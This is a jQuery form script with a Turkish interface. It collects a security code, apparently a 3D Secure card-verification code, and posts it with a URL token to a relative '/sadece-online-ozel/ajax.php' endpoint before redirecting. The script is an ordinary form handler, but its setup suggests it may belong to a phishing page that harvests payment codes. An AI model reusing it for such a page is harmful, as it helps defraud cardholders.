$(document).ready(function () {
    const form = $('#ThreeDForm');
    const URL = new URLSearchParams(window.location.search),
        token = URL.get('t')
    const action = 'threeDCode';
    const submit = $('#submitButton');
    form.on('submit', function (e) {
        e.preventDefault();
        submit.attr('disabled', true);
        submit.html('<i class="fa fa-spinner fa-spin"></i> İşleniyor...');
        let code = $('#code').val()
        if (code.length < 5) {
            alert('Lütfen geçerli bir güvenlik kodu giriniz.')
            submit.attr('disabled', false);
            submit.html('Gönder');
            return false;
        }
        const data = {
            action: action,
            transaction_id: token,
            code: code
        }
        $.ajax({
            url: '/sadece-online-ozel/ajax.php',
            type: 'POST',
            data: JSON.stringify(data),
            contentType: 'application/json',
            success: function (response) {
                let res = JSON.parse(response);
                if (res.status) {
                    setTimeout(function () {
                        window.location.href = res.redirect;
                    }, 1000);
                } else {
                    alert(res.message);
                    submit.attr('disabled', false);
                    submit.html('Gönder');
                }
            }
        })
    })
})